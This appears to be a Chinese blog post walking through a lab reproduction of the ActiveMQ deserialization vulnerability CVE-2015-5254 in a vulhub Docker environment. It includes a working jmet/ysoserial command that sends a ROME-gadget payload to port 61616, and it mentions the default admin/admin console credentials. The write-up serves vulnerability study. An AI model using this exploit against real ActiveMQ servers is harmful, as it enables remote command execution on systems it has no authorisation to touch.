# ActiveMQ 反序列化漏洞（CVE-2015-5254）复现 - 小丸子3689 - 博客园

> 原文：[https://www.cnblogs.com/ffx1/p/12653652.html](https://www.cnblogs.com/ffx1/p/12653652.html)

##### 1.运行漏洞环境

`sudo docker-compose up -d`

![启动docker环境](../Images/51832b132d5fa2b469b08c27cf2713c4.png)

环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问`http://your-ip:8161`即可看到web管理页面，不过这个漏洞理论上是不需要web的。

![访问8161 web页面](../Images/b41c75d5574f246a0131c75d564bd2ad.png)

##### 2.漏洞复现

漏洞利用过程如下：

1.  构造（可以使用ysoserial）可执行命令的序列化对象
2.  作为一个消息，发送给目标61616端口
3.  访问web管理页面，读取消息，触发漏洞

使用[jmet](https://github.com/matthiaskaiser/jmet)进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。

jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。

执行：

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616 
```

![image.png](../Images/265062cffbda8d27355438dd9c206219.png)
因为我就是在本地测试的，ip就填的`127.0.0.1`。
此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过`http://your-ip:8161/admin/browse.jsp?JMSDestination=event`看到这个队列中所有消息：（密码默认为admin/admin）
![image.png](../Images/0a40074a7a65aa6d6cc32c32cb07f4db.png)
![image.png](../Images/3fa14d516e1ed01e91e8ab67f7ef8fce.png)

点击查看新建的消息即可触发命令执行，此时进入容器`docker-compose exec activemq bash`，可见`/tmp/success`已成功创建，说明漏洞利用成功：
![image.png](../Images/9e4a72ccc10bf000a81180a467cf1265.png)

##### 3.参考

[https://vulhub.org/#/docs/download-vulhub/](https://vulhub.org/#/docs/download-vulhub/)
[https://www.cnblogs.com/backlion/p/9970516.html](https://www.cnblogs.com/backlion/p/9970516.html)